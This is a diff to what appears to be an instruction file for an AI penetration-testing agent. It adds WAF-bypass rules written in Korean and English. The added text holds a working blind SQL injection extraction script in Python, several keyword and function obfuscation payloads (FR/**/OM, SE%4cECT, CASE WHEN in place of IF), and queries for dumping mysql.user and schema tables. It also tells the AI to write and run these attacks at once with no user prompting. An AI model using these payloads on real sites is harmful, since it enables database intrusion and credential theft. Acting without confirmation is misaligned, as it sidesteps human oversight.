@@ -912,8 +912,104 @@ When WAF detected, auto-select by WAF type:
 [Chinese WAF: Safe3/D盾/云锁] → unicode (null byte) → encoding → function → space
 [Generic/Unknown] → space → keyword → header → encoding → function
 
-=== ADVANCED WAF BYPASS TECHNIQUES (NEW) ===
-AI automatically applies when standard techniques fail:
+=== ADVANCED WAF BYPASS TECHNIQUES (v5.6.0 COMPLETE) ===
+AI MUST apply these automatically — NO user prompting needed.
+
+[RULE: BLIND SQLi 데이터 추출 — 완전 자동 커스텀 스크립트 작성]
+  WAF 환경 blind SQLi 데이터 추출 시 반드시 아래 Python 스크립트를 직접 작성/실행:
+
+  import requests, urllib3, string, time
+  urllib3.disable_warnings()
+  UA = "Mozilla/5.0"
+  BASE = "https://TARGET"
+  PARAMS = {"key": "val"}   # 기본 파라미터
+
+  def test(payload):
+      r = requests.get(f"{BASE}/page.php",
+                       params={**PARAMS, "vuln_param": f"VAL' AND ({payload})-- -"},
+                       headers={"User-Agent": UA}, timeout=10, verify=False)
+      return len(r.text)
+
+  NORMAL = test("1=1")   # baseline TRUE size
+  FALSE  = test("1=2")   # baseline FALSE size
+  THRESHOLD = abs(NORMAL - FALSE) // 2  # 동적 임계값
+
+  def is_true(payload):
+      size = test(payload)
+      return abs(size - NORMAL) < THRESHOLD  # TRUE면 NORMAL에 가까움
+
+  # 문자열 추출 (한 글자씩)
+  def extract_char(pos, expr):
+      for c in string.printable:
+          if is_true(f"SUBSTRING({expr},{pos},1)='{c}'"):
+              return c
+      return "?"
+
+  위 스크립트를 타겟에 맞게 수정 후 즉시 실행 — 툴 함수 의존 말고 직접 작성!
+
+[SQL Function Replacement — 키워드/함수 차단 우회 전략]
+  • IF(a,b,c)   → CASE/**/WHEN/**/a/**/THEN/**/b/**/ELSE/**/c/**/END
+  • SLEEP(n)    → (SELECT count(*) FROM information_schema.columns A,
+                   information_schema.columns B, information_schema.columns C)
+  • BENCHMARK   → BENCHMARK(50000000,MD5(1))
+  • AND/OR      → &&/||  (가장 효과적, 키워드 자체 차단 우회)
+  • UNION SELECT → UNION%0aSELECT (뉴라인 삽입)
+
+[★ 문자열 추출 함수 차단 시 RIGHT+REVERSE+LIKE 우회 ★]
+  SUBSTRING / MID / SUBSTR / LEFT / RIGHT 모두 차단된 경우:
+
+  방법 1 — RIGHT + REVERSE + LIKE (차단 가장 어려움):
+    SUBSTRING(expr, pos, 1) = 'X'
+    →  REVERSE(RIGHT(REVERSE(expr), LENGTH(expr)-pos+1)) LIKE 'X%'
+    →  또는: RIGHT(expr, LENGTH(expr)-pos+1) LIKE 'X%' (앞 글자 확인용)
+
+  방법 2 — LIKE 패턴 매칭으로 추출:
+    expr LIKE 'abc%'  → 앞 3글자가 'abc'인지 확인
+    이진 탐색 + LIKE로 한 글자씩 추출:
+      expr LIKE 'a%' → True면 첫 글자 'a'
+      expr LIKE 'aa%' → 두번째 글자 확인
+    
+  방법 3 — ORD/ASCII 차단 시 HEX 비교:
+    ORD(SUBSTRING(expr,1,1)) = 97
+    → HEX(SUBSTRING(expr,1,1)) = '61'
+    → CONV(HEX(SUBSTRING(expr,1,1)),16,10) = 97
+
+  방법 4 — LOCATE/POSITION 사용:
+    LOCATE('X', expr, pos) = pos  → pos 위치 글자가 'X'
+
+  실전 Python 추출 코드 (RIGHT+REVERSE+LIKE):
+    def extract_char_like(pos, expr, total_len):
+        for c in 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_@.':
+            payload = f"RIGHT(REVERSE({expr}),{total_len-pos+1}) LIKE REVERSE('{c}%')"
+            if is_true(payload):
+                return c
+        return "?"
+
+[★ SQL 키워드 차단 우회 — FROM/SELECT/WHERE ★]
+  FROM 차단 시 (FR/**/OM이 핵심!):
+    FROM          → FR/**/OM
+    FROM          → FR%0aOM  (뉴라인)
+    FROM          → FR%09OM  (탭)
+    FROM          → F%52OM   (URL encode R)
+    FROM          → `FROM`   (백틱 감싸기)
+
+  SELECT 차단 시:
+    SELECT        → SE/**/LECT
+    SELECT        → SE%4cECT  (URL encode L)
+    SELECT        → SE\LECT   (백슬래시)
+    SELECT        → (SELECT)  (괄호 감싸기)
+
+  WHERE 차단 시:
+    WHERE         → WH/**/ERE
+    WHERE col=val → HAVING col=val (집계 없이도 작동하는 경우)
+
+  TABLE NAME 직접 접근 (information_schema 차단 시):
+    mysql.user, mysql.db, sys.user_summary 직접 접근 시도
+    → SELECT * FR/**/OM mysql.user LIM/**/IT 1
+
+  실전 member 테이블 덤프 (FR/**/OM 우회):
+    SELECT table_name FR/**/OM information_schema.tables WH/**/ERE table_schema=database()
+    → FR/**/OM 차단 안 되면 바로 사용, 차단이면 FR%0aOM 또는 FR\x00OM 시도
 
 [SQL Function Replacement — blocks IF/SLEEP/BENCHMARK]
   • IF(a,b,c)   → CASE/**/WHEN/**/a/**/THEN/**/b/**/ELSE/**/c/**/END
